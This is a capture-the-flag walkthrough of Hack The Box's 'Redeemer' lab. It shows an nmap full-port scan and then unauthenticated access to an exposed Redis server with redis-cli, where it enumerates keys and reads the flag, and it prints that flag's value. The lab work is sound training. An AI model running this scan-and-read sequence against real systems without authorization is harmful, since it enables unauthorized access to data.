+++
title = "Redeemer"
description = "Starting Point machine focused on service enumeration and access through Redis."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
"Redis",
"Starting Point",
"Foundations"
]

image = "/images/writeups/redeemer.png"
+++

### Overview

**Redeemer** is a machine from the **Starting Point** path on Hack The Box. It is designed to practice fundamental concepts of service enumeration and database access through Redis.

The objective is to identify the exposed Redis service, connect to the server, and enumerate the stored keys to obtain the flag.

---

### Enumeration

We begin by performing a full port scan with **Nmap**:

```bash
sudo nmap -p- -sS --min-rate 5000 -T4 -Pn <TARGET_IP>
```

The scan shows a single open port:

```text
PORT     STATE SERVICE
6379/tcp open  redis
```

Port `6379/tcp` corresponds to the **Redis** service, so we proceed to investigate the service.

---

### Initial Access

We use `redis-cli` and specify the target IP address:

```bash
redis-cli -h <TARGET_IP>
```

The connection is established successfully:

```text
<TARGET_IP>:6379>
```

Once connected, we query the server information using the `info` command:

```bash
info
```

Among the retrieved information, we can identify the Redis version:

```text
redis_version:5.0.7
```

We can also confirm that the server is running **Linux**:

```text
os:Linux 5.4.0-77-generic x86_64
```

We continue enumerating the database by selecting database `0`:

```bash
SELECT 0
```

Redis confirms that the operation was successful:

```text
OK
```

We enumerate the stored keys using:

```bash
KEYS *
```

The server returns four keys:

```text
1) "temp"
2) "flag"
3) "numb"
4) "stor"
```

The `flag` key is particularly interesting, so we proceed to retrieve its value.

---

### Flag

We query the contents of the `flag` key using the `GET` command:

```bash
GET flag
```

Redis returns the stored value:

```text
"03e1d2b376c37ab3f5319922053953eb"
```

This gives us the flag and completes the **Redeemer** machine.

---

### Conclusion

**Redeemer** presents a straightforward scenario primarily focused on service enumeration and access to an exposed Redis instance.

The methodology followed was:

```text
Enumeration
    ↓
Port 6379 Identification
    ↓
Redis Detection
    ↓
Connection using redis-cli
    ↓
Database Enumeration
    ↓
Flag Key Identification
    ↓
Flag Retrieval
```

Despite its **Very Easy** difficulty, the machine reinforces the importance of properly identifying exposed services and understanding how to interact with them to locate information available on the system.

---

### [Status: Completed](https://labs.hackthebox.com/achievement/machine/3933963/472)

